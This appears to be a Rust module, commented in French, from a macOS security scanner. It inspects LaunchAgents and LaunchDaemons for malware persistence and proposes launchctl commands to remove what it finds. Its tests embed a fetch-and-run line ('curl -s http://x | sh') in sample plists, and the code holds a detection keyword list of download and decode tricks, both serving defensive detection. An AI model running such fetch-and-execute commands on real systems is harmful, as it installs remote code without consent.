//! Persistance sous macOS : ce qui se relance tout seul (LaunchAgents de l'utilisateur et du système,
//! LaunchDaemons). C'est le moyen favori des logiciels malveillants pour Mac (Adload, Shlayer, Atomic Stealer…).

use std::path::{Path, PathBuf};

use super::super::{Constat, alerte, impossible, ok};
use crate::plist::Valeur;
use crate::risk::Niveau;
use crate::{tr, trf};

const CAT: &str = "Persistance";

/// Ce qu'un .plist de launchd lance.
enum Lancement {
    Programme(String, String),
    /// Fichier fabriqué pour gêner l'analyse (références qui multiplient les copies, bornes dépassées, taille
    /// démesurée), ou binaire abîmé : jamais relu ni confié à plutil, qui développerait tout sans limite ; montré
    /// tel quel.
    Hostile,
    /// Les droits refusent la lecture (un LaunchDaemon de root en 600, que launchd lit mais pas Vanguard) : rien ne
    /// peut en être dit, et le bilan doit le savoir au lieu de le taire.
    Interdit,
    /// Absent, pas un fichier ordinaire (tube nommé), ou sans programme : sauté.
    Rien,
}

/// Programme lancé par un .plist de launchd, et ses arguments. Le fichier est lu directement ; plutil ne sert qu'en
/// secours, pour un format que le lecteur ne connaît pas, jamais pour un fichier refusé par ses bornes. Un fichier
/// ordinaire et lisible que ni le lecteur ni plutil ne savent lire (plutil en échec, trop lent, ou qui rend un XML
/// hors des bornes) est montré comme hostile : sauté, il disparaîtrait du bilan alors que launchd le lance peut-être.
fn programme(plist: &Path) -> Lancement {
    let lu = match crate::plist::lire_fichier(plist) {
        Ok(lu) => lu,
        Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => return Lancement::Interdit,
        Err(_) => return Lancement::Rien,
    };
    let reglages = match lu {
        crate::plist::Lu::Plist(r) => r,
        crate::plist::Lu::TropGros | crate::plist::Lu::Hostile => return Lancement::Hostile,
        crate::plist::Lu::Inconnu => {
            let secours = crate::commande::lancer(
                std::process::Command::new("plutil")
                    .args(["-convert", "xml1", "-o", "-"])
                    .arg(plist),
                10,
            )
            .and_then(|r| crate::plist::lire(r.sortie.as_bytes()));
            let Some(r) = secours else {
                return Lancement::Hostile;
            };
            r
        }
    };
    match lire_programme(&reglages) {
        Some((p, a)) => Lancement::Programme(p, a),
        None => Lancement::Rien,
    }
}

/// Program, ou à défaut le premier élément de ProgramArguments ; les arguments sont ceux de ProgramArguments après
/// le premier (launchd les passe aussi quand Program est donné, le premier faisant office de nom).
fn lire_programme(reglages: &Valeur) -> Option<(String, String)> {
    let elements: Vec<&str> = reglages
        .cle("ProgramArguments")
        .and_then(Valeur::tableau)
        .unwrap_or_default()
        .iter()
        .filter_map(Valeur::texte)
        .map(str::trim)
        .collect();
    let arguments = elements.get(1..).unwrap_or_default().join(" ");
    let programme = match reglages.cle("Program").and_then(Valeur::texte) {
        Some(p) => p.trim(),
        None => elements.first()?,
    };
    Some((programme.to_string(), arguments))
}

/// Ce qui rend un lancement suspect : dossier temporaire ou caché, script qui télécharge ou décode du code.
pub(super) fn soupcon(programme: &str, arguments: &str) -> Option<&'static str> {
    let p = programme.to_lowercase();
    if [
        "/tmp/",
        "/private/tmp/",
        "/private/var/tmp/",
        "/users/shared/",
        "/downloads/",
    ]
    .iter()
    .any(|d| p.contains(d))
    {
        return Some(tr!(
            "lancé depuis un dossier temporaire ou partagé",
            "run from a temporary or shared folder"
        ));
    }
    if p.split('/')
        .any(|morceau| morceau.starts_with('.') && morceau.len() > 1)
    {
        return Some(tr!("lancé depuis un dossier caché", "run from a hidden folder"));
    }
    let interprete = [
        "/bash",
        "/sh",
        "/zsh",
        "/python",
        "/python3",
        "/osascript",
        "/perl",
        "/ruby",
    ]
    .iter()
    .any(|i| p.ends_with(i));
    let a = arguments.to_lowercase();
    if interprete
        && ["curl ", "base64", "| sh", "|sh", "eval ", "osascript -e"]
            .iter()
            .any(|m| a.contains(m))
    {
        return Some(tr!(
            "script qui télécharge ou décode du code au démarrage",
            "script that downloads or decodes code at startup"
        ));
    }
    None
}

/// Les commandes qui arrêtent l'agent et mettent son fichier à la corbeille. Seuls les daemons
/// (/Library/LaunchDaemons) vivent dans le domaine `system` ; un agent, même posé dans
/// /Library/LaunchAgents, est chargé dans la session de la personne (gui/<uid>) : `bootout system`
/// ne le trouverait pas et il tournerait jusqu'à la déconnexion. `$(id -u)` est développé avant
/// `sudo` : c'est le compte de la personne, pas root.
fn arret_et_retrait(chemin: &Path, dossier: &Path, systeme: bool) -> (String, String) {
    let plist = crate::commande::sh_chaine(&chemin.display().to_string());
    if !systeme {
        return (
            format!("launchctl bootout gui/$(id -u) {plist}"),
            format!("mv {plist} ~/.Trash/"),
        );
    }
    let arret = if dossier.ends_with("LaunchDaemons") {
        format!("sudo launchctl bootout system {plist}")
    } else {
        format!("sudo launchctl bootout gui/$(id -u) {plist}")
    };
    (arret, format!("sudo mv {plist} ~/.Trash/"))
}

pub fn persistance() -> Vec<Constat> {
    let maison = crate::socle::maison();
    persistance_dans([
        (maison.join("Library/LaunchAgents"), false),
        (PathBuf::from("/Library/LaunchAgents"), true),
        (PathBuf::from("/Library/LaunchDaemons"), true),
    ])
}

/// Le bilan pour ces dossiers d'agents (le booléen : dossier du système, que `sudo` seul corrige).
pub(super) fn persistance_dans(dossiers: impl IntoIterator<Item = (PathBuf, bool)>) -> Vec<Constat> {
    let mut constats = Vec::new();
    let mut tiers = Vec::new();
    let mut interdits = 0usize;
    // Un dossier entier refusé (un intrus devenu root peut mettre /Library/LaunchDaemons en 700 : launchd le lit
    // toujours) cache tout ce qu'il contient ; seul un dossier absent n'a rien à dire.
    let mut dossiers_illisibles = Vec::new();
    for (dossier, systeme) in dossiers {
        let entrees = match std::fs::read_dir(&dossier) {
            Ok(entrees) => entrees,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(_) => {
                dossiers_illisibles.push(crate::ui::affichable(&dossier.display().to_string()));
                continue;
            }
        };
        for f in entrees {
            // Une entrée que le système ne rend pas est un agent qu'on n'a pas lu, pas un agent absent.
            let Ok(f) = f else {
                interdits += 1;
                continue;
            };
            let chemin = f.path();
            if chemin.extension().is_none_or(|e| e != "plist") {
                continue;
            }
            // Le nom du fichier et le programme lancé sont choisis par qui a posé l'agent : montrés rendus
            // inoffensifs ; les commandes, elles, visent le vrai fichier.
            let nom = crate::ui::affichable(f.file_name().to_string_lossy().trim_end_matches(".plist"));
            // Les services d'Apple vivent dans /System : ceux-ci sont tous ajoutés par des programmes installés.
            let (prog, args) = match programme(&chemin) {
                Lancement::Programme(p, a) => (p, a),
                Lancement::Rien => continue,
                Lancement::Interdit => {
                    interdits += 1;
                    continue;
                }
                Lancement::Hostile => {
                    tiers.push(nom.clone());
                    constats.push(
                        alerte(
                            CAT,
                            Niveau::Eleve,
                            trf!(
                                "L'agent « {nom} » est illisible ou fabriqué pour gêner l'analyse (références en boucle, copies multipliées ou taille démesurée) : aucun programme légitime n'écrit ça, mais un fichier abîmé donne aussi ce message.",
                                "Agent “{nom}” is unreadable or built to hinder analysis (looping references, multiplied copies or an outsized file): no legitimate program writes that, but a damaged file gives this message too."
                            ),
                        )
                        // Illisible : un autre objet que l'agent lisible accepté avant, jamais tu par ce choix.
                        .avec_objet(crate::modele::Objet::agent(&chemin.to_string_lossy(), None))
                        .manuel(
                            tr!(
                                "Regardez-le avec « plutil -p » dans le Terminal ; s'il ne vient d'aucun programme que vous connaissez, mettez-le à la corbeille et redémarrez",
                                "Look at it with “plutil -p” in Terminal; if it comes from no program you know, move it to the Trash and restart"
                            ),
                            &[],
                        ),
                    );
                    continue;
                }
            };
            tiers.push(nom.clone());
            let Some(raison) = soupcon(&prog, &args) else { continue };
            // L'objet : le fichier de l'agent et ce qu'il lance, valeurs brutes (avant `affichable`, jamais le nom
            // montré). Une autre commande dans le même fichier est un autre objet : le « c'est normal » d'avant ne
            // la tait pas. Les arguments comptent, `soupcon` les juge aussi.
            let objet = crate::modele::Objet::agent(&chemin.to_string_lossy(), Some(&format!("{prog} {args}")));
            let prog = crate::ui::affichable(&prog);
            let (arret, retrait) = arret_et_retrait(&chemin, &dossier, systeme);
            constats.push(
                alerte(
                    CAT,
                    Niveau::Eleve,
                    trf!(
                        "« {nom} » se relance à chaque démarrage, {raison} : {prog}. C'est la marque habituelle des logiciels malveillants pour Mac.",
                        "“{nom}” restarts at every boot, {raison}: {prog}. This is the usual mark of Mac malware."
                    ),
                )
                .avec_objet(objet)
                .corriger(
                    trf!(
                        "Arrêter « {nom} » et mettre son fichier à la corbeille (récupérable)",
                        "Stop “{nom}” and move its file to the Trash (recoverable)"
                    ),
                    &[format!("{arret} 2>/dev/null; true"), retrait],
                ),
            );
        }
    }
    // « Aucun programme tiers » ne se dit que si tout a été lu : sinon seuls les constats « non vérifié » parlent.
    let tout_lu = interdits == 0 && dossiers_illisibles.is_empty();
    if constats.is_empty() && (tout_lu || !tiers.is_empty()) {
        constats.push(if tiers.is_empty() {
            ok(
                CAT,
                tr!(
                    "Aucun programme tiers ne se relance au démarrage.",
                    "No third-party program restarts at boot."
                ),
            )
        } else {
            ok(
                CAT,
                trf!(
                    "{} programme(s) tiers se relancent au démarrage, rien de suspect : {}.",
                    "{} third-party program(s) restart at boot, nothing suspicious: {}.",
                    tiers.len(),
                    tiers.join(", ")
                ),
            )
        });
    }
    // Les agents que les droits cachent ne sont ni sains ni suspects : dits « non vérifiés », jamais passés sous
    // silence.
    if !dossiers_illisibles.is_empty() {
        let liste = dossiers_illisibles.join(", ");
        constats.push(impossible(
            CAT,
            &trf!(
                "dossier(s) d'agents de démarrage illisibles (droits refusés sans administrateur, ou dossier remplacé) : {liste}",
                "unreadable startup agent folder(s) (permissions refused without administrator rights, or folder replaced): {liste}"
            ),
        ));
    }
    if interdits > 0 {
        constats.push(impossible(
            CAT,
            &trf!(
                "{interdits} agent(s) de démarrage que les droits refusent de lire sans administrateur",
                "{interdits} startup agent(s) the permissions refuse to read without administrator rights"
            ),
        ));
    }
    constats
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lecture_des_plist() {
        let lire = |corps: &str| {
            let xml = format!("<?xml version=\"1.0\"?><plist version=\"1.0\"><dict>{corps}</dict></plist>");
            lire_programme(&crate::plist::lire(xml.as_bytes()).unwrap())
        };
        assert_eq!(
            lire(
                "<key>Label</key><string>com.ex.a</string><key>Program</key><string>/Applications/A.app/Contents/MacOS/a</string>"
            ),
            Some(("/Applications/A.app/Contents/MacOS/a".into(), String::new()))
        );
        let args = "<key>ProgramArguments</key>\n<array>\n\t<string>/bin/bash</string>\n\t<string>-c</string>\n\t<string>curl -s http://x | sh</string>\n</array>";
        assert_eq!(
            lire(args),
            Some(("/bin/bash".into(), "-c curl -s http://x | sh".into()))
        );
        // Program et ProgramArguments ensemble : les arguments comptent aussi.
        let ensemble = format!("<key>Program</key><string>/bin/bash</string>{args}");
        assert_eq!(
            lire(&ensemble),
            Some(("/bin/bash".into(), "-c curl -s http://x | sh".into()))
        );
        assert_eq!(lire("<key>Label</key><string>com.ex.a</string>"), None);
    }

    /// Un dossier d'agents refusé ne vaut pas « aucun programme tiers » ; un agent XML gonflé au-delà des bornes du
    /// lecteur est montré, pas sauté.
    fn messages(constats: &[Constat]) -> Vec<&str> {
        constats.iter().map(|c| c.message.as_str()).collect()
    }

    #[test]
    fn dossier_refuse_et_agent_hors_bornes() {
        use std::os::unix::fs::PermissionsExt;
        let racine = std::env::temp_dir().join(format!("vanguard-agents-{}", std::process::id()));
        let (refuse, gonfle, absent) = (racine.join("refuse"), racine.join("gonfle"), racine.join("absent"));
        std::fs::create_dir_all(&refuse).unwrap();
        std::fs::create_dir_all(&gonfle).unwrap();
        std::fs::write(
            gonfle.join("com.exemple.padding.plist"),
            format!(
                "<plist><dict><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>curl -s http://x | sh</string></array><key>Padding</key><array>{}</array></dict></plist>",
                "<true/>".repeat(250_000)
            ),
        )
        .unwrap();
        std::fs::set_permissions(&refuse, std::fs::Permissions::from_mode(0o000)).unwrap();
        // Root lit tout : le refus ne se voit que sans droits.
        let root = std::fs::read_dir(&refuse).is_ok();
        let constats = persistance_dans([(refuse.clone(), true), (absent, false)]);
        if !root {
            // Aucun « sain » : seulement le constat « non vérifié » qui nomme le dossier.
            assert!(constats.iter().all(|c| !c.verifie), "{:?}", messages(&constats));
            assert!(constats.iter().any(|c| c.message.contains("refuse")));
        }
        let constats = persistance_dans([(gonfle, false)]);
        assert!(
            constats
                .iter()
                .any(|c| c.verifie && c.probleme == Some(Niveau::Eleve) && c.message.contains("com.exemple.padding")),
            "{:?}",
            messages(&constats)
        );
        std::fs::set_permissions(&refuse, std::fs::Permissions::from_mode(0o700)).unwrap();
        std::fs::remove_dir_all(&racine).unwrap();
    }

    /// Un agent de /Library/LaunchAgents s'arrête dans la session, un daemon dans `system`.
    #[test]
    fn domaine_de_l_arret() {
        let agent = Path::new("/Library/LaunchAgents/com.exemple.a.plist");
        let (arret, retrait) = arret_et_retrait(agent, Path::new("/Library/LaunchAgents"), true);
        assert_eq!(
            arret,
            "sudo launchctl bootout gui/$(id -u) '/Library/LaunchAgents/com.exemple.a.plist'"
        );
        assert!(retrait.starts_with("sudo mv "));
        let daemon = Path::new("/Library/LaunchDaemons/com.exemple.d.plist");
        let (arret, _) = arret_et_retrait(daemon, Path::new("/Library/LaunchDaemons"), true);
        assert!(arret.starts_with("sudo launchctl bootout system "), "{arret}");
        let perso = Path::new("/Users/alice/Library/LaunchAgents/com.exemple.p.plist");
        let (arret, retrait) = arret_et_retrait(perso, Path::new("/Users/alice/Library/LaunchAgents"), false);
        assert!(arret.starts_with("launchctl bootout gui/$(id -u) ") && retrait.starts_with("mv "));
    }

    /// Le même fichier d'agent réécrit pour lancer un autre programme : autre clé, le choix d'avant ne la tait pas.
    #[test]
    fn agent_reecrit_autre_cle() {
        let dossier = std::env::temp_dir().join(format!("vanguard-agents-cle-{}", std::process::id()));
        std::fs::create_dir_all(&dossier).unwrap();
        let ecrire = |prog: &str| {
            std::fs::write(
                dossier.join("com.exemple.aide.plist"),
                format!("<plist><dict><key>Program</key><string>{prog}</string></dict></plist>"),
            )
            .unwrap();
            let c = persistance_dans([(dossier.clone(), false)]);
            let alerte = c.iter().find(|c| c.probleme == Some(Niveau::Eleve)).unwrap();
            alerte.objet.clone()
        };
        let avant = ecrire("/private/tmp/aide");
        let apres = ecrire("/private/tmp/autre");
        assert_ne!(avant, apres);
        assert_eq!(avant, ecrire("/private/tmp/aide"));
        std::fs::remove_dir_all(&dossier).unwrap();
    }

    #[test]
    fn programmes_suspects() {
        assert!(soupcon("/Users/a/Library/Application Support/.hidden/agent", "").is_some());
        assert!(soupcon("/private/tmp/x", "").is_some());
        assert!(soupcon("/bin/bash", "-c curl -s http://x | sh").is_some());
        assert!(soupcon("/Applications/Zoom.app/Contents/MacOS/zoom", "").is_none());
        assert!(soupcon("/Library/Application Support/Google/GoogleUpdater/launcher", "--wake").is_none());
    }
}
